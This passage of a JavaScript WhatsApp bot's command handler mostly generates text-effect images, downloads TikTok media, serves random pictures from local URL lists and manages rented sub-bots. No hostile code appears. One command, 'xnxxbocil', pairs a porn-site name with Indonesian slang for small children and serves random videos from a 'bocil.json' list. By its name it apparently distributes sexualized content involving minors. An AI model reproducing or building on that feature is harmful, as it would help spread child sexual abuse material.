maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'magma':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sand':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pencil':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'graffiti':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'harrpotter':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'underwater':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'luxury':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'glue2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neonlight':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'lava':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'toxic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'christmas2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sci_fi':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'rainbow':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'classic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'watercolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweem2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweenfire':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'writing':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'foggy':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'skeleton2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sketch':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'wonderful':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'batman':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'juice':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
ElgazarBot.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
ElgazarBot.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuror2 = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anuror2)
ElgazarBot.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
ElgazarBot.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case 'tiktok': case 'تيكتوك': { 
if (!text) return m.reply( `مثال : ${prefix + command} والرابط`)
if (!q.includes('tiktok')) return m.reply(`الرابط خطأ!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio ${q}`, buttonText: { displayText: `صوتي‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `الاوامر✨` }, type: 1 }]
ElgazarBot.sendMessage(m.chat, { caption: `حقوق: ᴇʟɢᴀᴢᴀʀ_ᴀʟᴡᴀᴢᴇʀ`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
ElgazarBot.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tiktokgirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokghea':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'xnxxbocil':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoknukhty':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoksantuy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokkayes':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokpanrika':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoknotnot':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'chinese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hijab':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'indo':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'japanese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'korean':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'malay':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomgirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomboy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'thai':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'vietnamese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'aesthetic':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'antiwork':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'blackpink':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'bike':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'boneka':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cosplay':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cat':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'doggo':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hacking':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/hacking.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'justina':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'kayes':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'kpop':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'notnot':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'car':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'profilepic':  case 'خلفيات':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ببجي':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'rose':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ryujin':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ulzzangboy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ulzzanggirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ويلبر': case 'wallphone':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break

case 'rentbot': {
if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
jadibot(ElgazarBot, m, m.chat)
}
break
case 'rentbotlist':
try {
let user = [... new Set([...global.conns.filter(ElgazarBot => ElgazarBot.user).map(ElgazarBot => ElgazarBot.user)])]
te = "*Bot Rent List*\n\n"
for (let i of user){
let y = await ElgazarBot.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
ElgazarBot.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`There are no users who have rented bot yet`)
}
break
case 'git': case 'جلب':
if (!args[0]) return m.reply(`أين الرابط?\nمثال :\n${prefix}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`الرابط غير صحيح!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
